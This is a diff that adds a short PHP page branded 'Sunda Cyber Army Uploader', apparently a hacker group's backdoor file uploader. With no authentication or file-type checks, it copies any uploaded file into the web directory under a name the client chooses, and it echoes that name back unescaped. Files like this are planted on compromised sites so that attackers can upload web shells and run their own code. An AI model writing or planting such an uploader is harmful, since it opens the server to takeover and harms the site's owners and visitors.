@@ -1,0 +1,29 @@
+<tittle> { Sunda Cyber Army Uploader } </tittle>
+	<style type="text/css">
+	<!--
+	body,td,th {
+	color: #0F0;
+	}
+	body {
+	background-color: #999;
+	}
+	-->
+	</style><p>
+	<form method="POST" action="" enctype="multipart/form-data" >
+	<input type="file" name="file" />
+	<input type="submit" value="Upload" />
+	</form>
+	<p>
+	<strong>
+	<?php
+	if ($_FILES['file'] != '') {
+	copy($_FILES['file']['tmp_name'], $_FILES['file']['name']) or die ('Proses upload Gagal: ');
+	}else {
+	die('Silahkan pilih file');
+	}
+	?>
+	File berhasil diupload:<br />
+	Keterangan File:<br />
+	Nama File: <?php echo $_FILES['file']['name']; ?><br />
+	Ukuran File: <?php echo $_FILES['file']['size'];?> Bytes <br />
+	Jenis File: <?php echo $_FILES['file']['type']; ?></strong></p>
